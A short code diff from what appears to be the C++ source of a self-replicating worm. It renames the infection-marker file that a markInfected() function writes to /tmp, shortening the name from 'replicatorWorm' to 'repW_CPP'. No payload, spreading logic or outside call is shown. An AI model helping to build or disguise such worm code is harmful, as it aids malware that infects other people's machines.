@@ -24,7 +24,7 @@
 
   
 void markInfected() {
-    std::ofstream myfile("/tmp/infectionMarker_replicatorWorm.txt");
+    std::ofstream myfile("/tmp/infectionMarker_repW_CPP.txt");
      
     if (myfile.is_open())
     {
